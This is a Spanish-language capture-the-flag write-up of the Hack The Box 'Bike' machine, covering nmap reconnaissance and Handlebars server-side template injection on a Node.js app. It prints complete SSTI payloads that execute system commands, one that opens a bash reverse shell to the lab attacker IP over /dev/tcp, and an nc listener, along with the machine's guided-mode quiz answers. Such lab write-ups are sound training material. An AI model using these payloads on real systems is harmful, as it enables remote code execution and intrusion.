---
title: Writeup bike - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - bike
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina bike en Hack The Box.
keywords:
  - writeup bike
  - hack the box bike
  - resolución máquina bike
  - bike  hack the box
  - htb bike
---
-------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/SuperFacil/Tier+1/Linux/Bike)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=q5oWw54r5pY)|[Parte2](https://www.youtube.com/watch?v=vJJ28Wl9qSw)
- 🧠 **Explicación resumida**: [Link](https://www.youtube.com/watch?v=MqP9yqdmNuA)

---

#veryeasy #linux #nmap #ping #ssti #reverseshell #burpsuite #nc-nlvp443 

------
# Guided Mode

1)¿Qué puertos TCP identifica nmap como abiertos? Responda con una lista de puertos separados por comas sin espacios, de menor a mayor.
	22,80

2)¿Qué software está ejecutando el servicio que escucha en el puerto http/web identificado en la primera pregunta?
	node.js

3)¿Cuál es el nombre del Web Framework según Wappalyzer?
	express

4)¿Cómo se llama la vulnerabilidad que comprobamos al enviar {{7\*7}}?
	server side template injection

5)¿Cuál es el motor de plantillas que se utiliza en Node.JS?
	handlebars

6)¿Cómo se llama la pestaña de BurpSuite que se utiliza para codificar texto?
	decoder

7)Para enviar caracteres especiales en nuestra carga útil en una petición HTTP, codificaremos la carga útil. ¿Qué tipo de codificación utilizamos?
	url

8)Cuando usamos un payload de HackTricks para intentar ejecutar comandos del sistema, obtenemos un error de respuesta. Qué es «no definido» en el error de respuesta?
	require

9)¿Qué variable es tradicionalmente el nombre del ámbito de nivel superior en el contexto del navegador, pero no en Node.JS?
	global

10)Explotando esta vulnerabilidad, conseguimos la ejecución de comandos como el usuario con el que se está ejecutando el servidor web. ¿Cuál es el nombre de ese usuario?
	root

-----
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.178.83
nmap -p- --open -vvv --min-rate 5000 -sS -n -Pn 10.129.178.83 -oG allPorts
extractPorts allPorts
nmap -sCV -p22,80 10.129.178.83 -oN target
```

![[Bike1.png]]

![[Bike2.png]]
*TTL:* Maquina Linux
*Puertos*
	`22` [[ssh]]
	`80` HTTP

----

# [[Whatweb-wappalyzer]]

```shell
whatweb http://10.129.178.83/
```

![[Bike3.png]]

![[Bike4.png]]
Nos informa que esta corriendo un node.js

-----

# Intrusion a la maquina con [[Server-Side Template Injection (SSTI)]] 

Probamos poner {{7\*7}} y nos da un error que nos redirige a una consola en node.js
![[Bike5.png]]


![[Bike10.png]]

## Interceptamos petición con caido para mandar una [[Reverse shell]]


[Link del articulo hacktriks](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#handlebars-nodejsl) del cual sacamos el payload
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

Esto hay que url encodearlo, hacemos click derecho seleccionando todo el texto y en convert, ponemos URL Enconde

![[Bike8.png]]

Este es el resultado final del payload url encodeado
![[Bike7.png]]


## Ajustamos el payload con variables globales para que funcione

Vamos a ajustar con variables globales el payload, para que nos de una respuesta y probar si sirve o no el mismo
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

*Cambie esta linea:*

```
{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
```

Tuve que usar `process.mainModule.require` en lugar de `require` porque en muchos entornos de Handlebars `require` no está disponible directamente desde el contexto de plantilla, ya sea por sandboxing o por cómo se construyó el entorno. Sin embargo, `process` suele estar expuesto, y a través de `process.mainModule.require` pude cargar módulos de Node.js igual que con `require`.

Cambie `exec` por `execSync` porque `exec` no devuelve el resultado del comando directamente. En cambio, necesita una función extra (llamada **callback**) que se ejecuta después para mostrar el resultado. Como eso no se puede usar dentro de una plantilla, no funciona.
`execSync` sí devuelve el resultado del comando directamente, como un texto, así que puedo mostrarlo en la respuesta del servidor sin complicaciones.
*Igualmente para mandar la [[Reverse shell]]* no hace falta poner el execSync dado que no nos tiene que mandar ningun string en respuesta, eso solamente lo usamos para testear si habia un RCE o no


#### Hacemos la prueba para ver si nos responde que usuario somos por el whoami
Y como se ve, nos responde que somos root
![[Bike11.png]]


------

# [[Reverse shell]] 

Para que ande el payload hay que escapar las comillas internas, esto siempre se pone todo url encodeado
```
email={{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').exec('bash -c \'bash -i >& /dev/tcp/10.10.16.16/443 0>&1\'');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
&action=Submit
```

Nos ponemos en escucha con [[nc -nlvp 443]], una vez que estamos dentro de la maquina, ya podemos catear la flag

```shell
nc -nlvp 443
```

![[Bike9.png]]

----------
# Notas

#### Diferencias entre sincrono y asincrono:
##### Sincrono:
El programa espera a que termine una tarea antes de seguir con la proxima
##### Asincrono
Ejecuta todas las tareas al mismo tiempo y no se esperan entre si


#### Callback

Es una **función que se ejecuta después** de que otra terminó una tarea, especialmente útil para manejar resultados de operaciones **lentas** o **asíncronas**.

---------
# Creditos
Writeup oficial de HackTheBox